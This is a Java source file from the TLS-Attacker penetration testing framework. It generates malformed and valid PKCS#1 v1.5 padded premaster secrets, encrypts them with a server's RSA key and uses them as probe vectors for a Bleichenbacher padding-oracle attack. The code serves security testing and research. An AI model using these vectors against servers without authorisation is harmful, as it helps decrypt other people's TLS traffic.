/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.pkcs1;

import de.rub.nds.tlsattacker.attacks.config.BleichenbacherCommandConfig;
import de.rub.nds.tlsattacker.tls.constants.HandshakeByteLength;
import de.rub.nds.tlsattacker.tls.exceptions.ConfigurationException;
import de.rub.nds.tlsattacker.util.ArrayConverter;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPublicKey;
import java.util.Arrays;
import java.util.Random;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class PKCS1VectorGenerator {

    private static final int STATIC_VECTOR_SIZE = 11;

    private static final Logger LOGGER = LogManager.getLogger(PKCS1VectorGenerator.class);

    /**
     * Generates different encrypted PKCS1 vectors
     * 
     * @param publicKey
     * @param type
     * @return
     */
    public static byte[][] generatePkcs1Vectors(RSAPublicKey publicKey, BleichenbacherCommandConfig.Type type) {

        // we do not need secure random here
        Random random = new Random();
        byte[] keyBytes = new byte[HandshakeByteLength.PREMASTER_SECRET];
        random.nextBytes(keyBytes);
        int rsaKeyLength = publicKey.getModulus().bitLength() / 8;

        // compute the number of all vectors that are being generated
        int vectorSize = STATIC_VECTOR_SIZE;
        if (type == BleichenbacherCommandConfig.Type.FULL) {
            vectorSize += rsaKeyLength - 2;
        }

        // create plain padded keys
        byte[][] plainPaddedKeys = new byte[vectorSize][];
        plainPaddedKeys[0] = getEK_NoNullByte(rsaKeyLength, keyBytes);
        plainPaddedKeys[1] = getEK_NullByteInPadding(rsaKeyLength, keyBytes);
        plainPaddedKeys[2] = getEK_NullByteInPkcsPadding(rsaKeyLength, keyBytes);
        plainPaddedKeys[3] = getEK_SymmetricKeyOfSize(rsaKeyLength, keyBytes, 0);
        plainPaddedKeys[4] = getEK_SymmetricKeyOfSize(rsaKeyLength, keyBytes, 1);
        plainPaddedKeys[5] = getEK_SymmetricKeyOfSize(rsaKeyLength, keyBytes, 8);
        plainPaddedKeys[6] = getEK_SymmetricKeyOfSize(rsaKeyLength, keyBytes, 16);
        plainPaddedKeys[7] = getEK_SymmetricKeyOfSize(rsaKeyLength, keyBytes, 32);
        plainPaddedKeys[8] = getEK_WrongFirstByte(rsaKeyLength, keyBytes);
        plainPaddedKeys[9] = getEK_WrongSecondByte(rsaKeyLength, keyBytes);
        // correct key (with invalid TLS version number)
        plainPaddedKeys[10] = getPaddedKey(rsaKeyLength, keyBytes);

        if (type == BleichenbacherCommandConfig.Type.FULL) {
            byte[][] additionalPaddedKeys = getEK_DifferentPositionsOf0x00(rsaKeyLength, keyBytes);
            System.arraycopy(additionalPaddedKeys, 0, plainPaddedKeys, STATIC_VECTOR_SIZE, additionalPaddedKeys.length);
        }

        try {
            Cipher rsa = Cipher.getInstance("RSA/NONE/NoPadding");
            rsa.init(Cipher.ENCRYPT_MODE, publicKey);
            byte[][] encryptedKeys = new byte[vectorSize][];
            // encrypt all the padded keys
            for (int i = 0; i < encryptedKeys.length; i++) {
                encryptedKeys[i] = rsa.doFinal(plainPaddedKeys[i]);
            }

            return encryptedKeys;
        } catch (BadPaddingException | IllegalBlockSizeException | InvalidKeyException | NoSuchAlgorithmException
                | NoSuchPaddingException ex) {
            throw new ConfigurationException("The different PKCS#1 attack vectors could not be generated.", ex);
        }
    }

    /**
     * Generates a validly padded message
     * 
     * @param rsaKeyLength
     *            rsa key length in bytes
     * @param symmetricKeyLength
     *            symmetric key length in bytes
     * @return
     */
    private static byte[] getPaddedKey(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = new byte[rsaKeyLength];
        // fill all the bytes with non-zero values
        Arrays.fill(key, (byte) 42);
        // set the first byte to 0x00
        key[0] = 0x00;
        // set the second byte to 0x02
        key[1] = 0x02;
        // set the separating byte
        key[rsaKeyLength - symmetricKey.length - 1] = 0x00;
        // copy the symmetric key to the field
        System.arraycopy(symmetricKey, 0, key, rsaKeyLength - symmetricKey.length, symmetricKey.length);
        LOGGER.debug("Generated a PKCS1 padded message a correct key length, but invalid protocol version: {}",
                ArrayConverter.bytesToHexString(key));

        return key;
    }

    private static byte[] getEK_WrongFirstByte(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[0] = 23;
        LOGGER.debug("Generated a PKCS1 padded message with a wrong first byte: {}",
                ArrayConverter.bytesToHexString(key));
        return key;
    }

    private static byte[] getEK_WrongSecondByte(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[1] = 23;
        LOGGER.debug("Generated a PKCS1 padded message with a wrong second byte: {}",
                ArrayConverter.bytesToHexString(key));
        return key;
    }

    private static byte[] getEK_NoNullByte(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        LOGGER.debug("Generated a PKCS1 padded message with no separating byte: {}",
                ArrayConverter.bytesToHexString(key));
        return key;
    }

    private static byte[] getEK_NullByteInPkcsPadding(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[3] = 0x00;
        LOGGER.debug("Generated a PKCS1 padded message with a 0x00 byte in the PKCS1 padding: {}",
                ArrayConverter.bytesToHexString(key));
        return key;
    }

    private static byte[] getEK_NullByteInPadding(int rsaKeyLength, byte[] symmetricKey) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        key[11] = 0x00;
        LOGGER.debug("Generated a PKCS1 padded message with a 0x00 byte in padding: {}",
                ArrayConverter.bytesToHexString(key));
        return key;
    }

    private static byte[] getEK_SymmetricKeyOfSize(int rsaKeyLength, byte[] symmetricKey, int size) {
        byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
        for (int i = 3; i < key.length; i++) {
            if (key[i] == 0x00) {
                key[i] = 0x01;
            }
        }
        key[rsaKeyLength - size - 1] = 0x00;
        LOGGER.debug("Generated a PKCS1 padded symmetric key of size {}: {}", size,
                ArrayConverter.bytesToHexString(key));
        return key;
    }

    /**
     * @param rsaKeyLength
     * @param symmetricKey
     * @return
     */
    private static byte[][] getEK_DifferentPositionsOf0x00(int rsaKeyLength, byte[] symmetricKey) {
        byte[][] result = new byte[rsaKeyLength - 2][];
        for (int i = 2; i < rsaKeyLength; i++) {
            // generate padded key
            byte[] key = getPaddedKey(rsaKeyLength, symmetricKey);
            // remove 0x00
            for (int j = 3; j < key.length; j++) {
                if (key[j] == 0x00) {
                    key[j] = 0x01;
                }
            }
            result[i - 2] = key;
            // insert 0x00 to an incorrect position
            result[i - 2][i] = 0x00;
        }
        LOGGER.debug("Generated PKCS1 vectors with different invalid 0x00 positions");

        return result;
    }

    /**
     * No instantiation needed, only one static method used
     */
    private PKCS1VectorGenerator() {
    }
}
